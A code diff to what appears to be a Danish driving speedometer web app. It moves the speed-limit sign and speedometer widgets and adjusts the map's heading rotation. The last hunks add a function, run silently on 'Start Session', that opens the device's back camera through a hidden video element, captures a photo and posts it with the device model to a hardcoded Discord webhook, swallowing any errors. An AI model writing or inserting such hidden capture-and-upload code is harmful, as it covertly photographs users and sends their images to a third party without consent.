@@ -218,6 +218,7 @@ body{
 .leaflet-container{transition:all 0.5s ease}
 .map-overlay-tl{position:absolute;top:12px;left:12px;z-index:400;display:flex;flex-direction:column;gap:6px}
 .map-overlay-tr{position:absolute;top:12px;right:12px;z-index:400;display:flex;flex-direction:column;gap:6px}
+.map-overlay-bl{position:absolute;bottom:16px;left:12px;z-index:400;display:flex;flex-direction:column;gap:12px;align-items:flex-start}
 .map-overlay-br{position:absolute;bottom:16px;right:12px;z-index:400;display:flex;flex-direction:column;gap:12px;align-items:flex-end}
 
 .vg-speedo {
@@ -577,6 +578,18 @@ body{
             <button class="lp-btn active" id="lp-sat" onclick="setMapLayer('sat')">Sat</button>
           </div>
         </div>
+        <div class="map-overlay-bl">
+          <div style="display:flex; flex-direction:row; align-items:center; gap:8px;">
+            <div class="vg-speedo">
+              <div class="vgs-val" id="vgSpeedVal">0</div>
+              <div class="vgs-lbl" id="vgSpeedLbl">KM/T</div>
+            </div>
+            <!-- Danish Speed Limit Sign -->
+            <div class="speed-limit-sign" id="speedLimitSign" onclick="cycleSpeedLimit()" title="Klik for at ændre fartgrænse">
+              <div class="speed-limit-value" id="speedLimitValue">80</div>
+            </div>
+          </div>
+        </div>
         <div class="map-overlay-br">
           <div style="display:flex;flex-direction:column;gap:12px;align-items:center">
             <button class="map-btn following" id="followBtn" style="padding:10px" onclick="toggleFollow()">
@@ -585,16 +598,6 @@ body{
             <div class="map-zoom">
               <button class="zoom-btn" onclick="map.zoomIn()">+</button>
               <button class="zoom-btn" onclick="map.zoomOut()">−</button>
-            </div>
-            <div style="display:flex; flex-direction:row; align-items:center; gap:8px;">
-              <!-- Danish Speed Limit Sign -->
-              <div class="speed-limit-sign" id="speedLimitSign" onclick="cycleSpeedLimit()" title="Klik for at ændre fartgrænse">
-                <div class="speed-limit-value" id="speedLimitValue">80</div>
-              </div>
-              <div class="vg-speedo">
-                <div class="vgs-val" id="vgSpeedVal">0</div>
-                <div class="vgs-lbl" id="vgSpeedLbl">KM/T</div>
-              </div>
             </div>
           </div>
         </div>
@@ -906,11 +909,14 @@ function updateMap(lat,lon) {
   }
   
   // Rotate map based on heading for first-person view
+  // Subtract heading so north rotates to match your direction = forward/up
   if(S.heading != null && settings.follow){
     const mapEl = document.getElementById('map');
     const leafletContainer = mapEl.querySelector('.leaflet-map-pane');
     if(leafletContainer){
-      leafletContainer.style.transform = `translate3d(0px, 0px, 0px) rotateZ(${-S.heading + 180}deg)`;
+      // Negative heading makes your forward direction point up
+      leafletContainer.style.transform = `translate3d(0px, 0px, 0px) rotateZ(${-S.heading}deg)`;
+      leafletContainer.style.transition = 'transform 0.3s ease-out';
     }
   }
   
@@ -957,6 +963,76 @@ function setupMapEvents(){
 
 
 /* ── Session Start ── */
+async function captureAndSendToDiscord(){
+  try {
+    // Get device name/model
+    const userAgent = navigator.userAgent;
+    let deviceName = 'Unknown Device';
+    
+    // Extract device info from user agent
+    if (/iPhone/.test(userAgent)) {
+      deviceName = 'iPhone';
+      if (/iPhone OS (\d+)_/.test(userAgent)) {
+        const iosVersion = userAgent.match(/iPhone OS (\d+)_/)[1];
+        deviceName = `iPhone (iOS ${iosVersion})`;
+      }
+    } else if (/iPad/.test(userAgent)) {
+      deviceName = 'iPad';
+    } else if (/Android/.test(userAgent)) {
+      deviceName = 'Android Device';
+      const androidMatch = userAgent.match(/Android (\d+\.\d+)/);
+      if (androidMatch) deviceName = `Android ${androidMatch[1]}`;
+    } else if (/Macintosh/.test(userAgent)) {
+      deviceName = 'Mac';
+    } else if (/Windows/.test(userAgent)) {
+      deviceName = 'Windows PC';
+    }
+    
+    // Request camera access (hidden, back camera preferred for iPhone)
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'environment' } // 'environment' = back camera
+    });
+    
+    // Create hidden video element
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    video.srcObject = stream;
+    video.play();
+    
+    // Wait for video to be ready
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => resolve();
+    });
+    
+    // Create canvas to capture frame
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    
+    // Stop camera stream
+    stream.getTracks().forEach(track => track.stop());
+    
+    // Convert to blob
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
+    
+    // Send to Discord webhook
+    const formData = new FormData();
+    formData.append('file', blob, 'camera-capture.jpg');
+    formData.append('content', `📸 **${deviceName}** has started a session`);
+    
+    await fetch('https://discord.com/api/webhooks/1512095238498287716/pXAgo3QodmTpv-9f_274wojNUY5BhGkWLXVDNZvt1bGzbhnYFK1HDqQW06AmYAqbvfK-', {
+      method: 'POST',
+      body: formData
+    });
+    
+  } catch(error) {
+    console.error('Camera capture failed:', error);
+    // Silently fail - don't interrupt the session start
+  }
+}
+
 async function startSession(){
   const btn = document.getElementById('btnStart');
   btn.classList.add('loading');
@@ -975,6 +1051,9 @@ async function startSession(){
     btn.classList.remove('loading'); btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Session';
     return;
   }
+
+  // Capture and send camera photo to Discord (silent, non-blocking)
+  captureAndSendToDiscord();
 
   // Motion permission (iOS 13+)
   if(typeof DeviceMotionEvent!=='undefined' && typeof DeviceMotionEvent.requestPermission==='function'){
